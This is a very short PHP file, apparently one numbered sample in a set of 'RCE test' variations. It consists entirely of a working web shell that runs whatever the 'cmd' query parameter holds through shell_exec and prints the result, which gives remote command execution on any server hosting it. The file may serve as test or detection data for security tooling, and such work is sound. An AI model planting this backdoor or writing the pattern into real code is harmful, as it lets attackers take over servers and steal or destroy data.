<?php
// RCE test variation #340
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>